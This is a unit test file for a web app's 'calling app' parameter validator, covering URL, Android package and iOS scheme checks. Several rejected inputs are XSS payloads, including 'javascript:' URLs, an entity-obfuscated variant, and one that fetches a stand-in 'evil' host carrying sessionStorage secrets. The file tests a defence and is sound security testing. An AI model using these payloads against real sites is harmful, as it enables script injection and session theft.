import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
	isValidCallingAppType,
	isValidCallingAppCode,
	validateCallingAppParams,
	callingAppHost
} from '../src/lib/callingApp.ts';

test('isValidCallingAppType accepts the five known types', () => {
	for (const t of ['modal', 'web', 'popup', 'android', 'ios']) {
		assert.equal(isValidCallingAppType(t), true, t);
	}
	assert.equal(isValidCallingAppType('javascript'), false);
	assert.equal(isValidCallingAppType(''), false);
	assert.equal(isValidCallingAppType(null), false);
	assert.equal(isValidCallingAppType(undefined), false);
});

test('web/popup codes must be https URLs (http only for localhost)', () => {
	assert.equal(isValidCallingAppCode('web', 'https://example.com/app'), true);
	assert.equal(isValidCallingAppCode('popup', 'https://app.example.com'), true);
	assert.equal(isValidCallingAppCode('web', 'http://localhost:5173'), true);
	assert.equal(isValidCallingAppCode('web', 'http://127.0.0.1:3000'), true);
	assert.equal(isValidCallingAppCode('web', 'http://example.com'), false);
	assert.equal(isValidCallingAppCode('web', 'javascript:alert(1)'), false);
	assert.equal(isValidCallingAppCode('web', 'jav&#x09;ascript:alert(1)'), false);
	assert.equal(isValidCallingAppCode('popup', 'data:text/html,hi'), false);
	assert.equal(isValidCallingAppCode('web', 'not a url'), false);
	assert.equal(isValidCallingAppCode('web', ''), false);
	assert.equal(isValidCallingAppCode('web', null), false);
});

test('android codes must be package names', () => {
	assert.equal(isValidCallingAppCode('android', 'com.example.app'), true);
	assert.equal(isValidCallingAppCode('android', 'io.getcurrent.Current'), true);
	assert.equal(isValidCallingAppCode('android', 'example'), false); // no dot
	assert.equal(isValidCallingAppCode('android', 'com.9bad.start'), false);
	assert.equal(isValidCallingAppCode('android', 'com.example.app/evil'), false);
	assert.equal(isValidCallingAppCode('android', 'javascript:alert(1)'), false);
});

test('ios codes must be safe url schemes', () => {
	assert.equal(isValidCallingAppCode('ios', 'nostr'), true);
	assert.equal(isValidCallingAppCode('ios', 'my-nostr.app'), true);
	assert.equal(isValidCallingAppCode('ios', 'javascript'), false);
	assert.equal(isValidCallingAppCode('ios', 'JAVASCRIPT'), false);
	assert.equal(isValidCallingAppCode('ios', 'data'), false);
	assert.equal(isValidCallingAppCode('ios', 'http'), false);
	assert.equal(isValidCallingAppCode('ios', 'https'), false);
	assert.equal(isValidCallingAppCode('ios', 'file'), false);
	assert.equal(isValidCallingAppCode('ios', '9str'), false); // must start with a letter
});

test('validateCallingAppParams returns the triple or null', () => {
	assert.deepEqual(validateCallingAppParams('Coracle', 'web', 'https://coracle.social'), {
		name: 'Coracle',
		type: 'web',
		code: 'https://coracle.social'
	});
	assert.equal(validateCallingAppParams('Coracle', 'web', 'javascript:alert(1)'), null);
	assert.equal(validateCallingAppParams('Coracle', ' fax ', 'https://x'), null);
	assert.equal(validateCallingAppParams('', 'web', 'https://x'), null);
	assert.equal(validateCallingAppParams(null, 'web', 'https://x'), null);
	assert.equal(validateCallingAppParams('App', 'web', null), null);
	// an xss attempt like /?an=X&at=web&ac=javascript:... must be rejected
	assert.equal(
		validateCallingAppParams('X', 'web', 'javascript:fetch("//evil?t="+sessionStorage.sk)'),
		null
	);
});

test('callingAppHost extracts the hostname for web/popup', () => {
	assert.equal(callingAppHost('web', 'https://app.example.com/wizard?x=1'), 'app.example.com');
	assert.equal(callingAppHost('popup', 'http://localhost:5173/#x'), 'localhost');
	assert.equal(callingAppHost('android', 'com.example.app'), null);
});
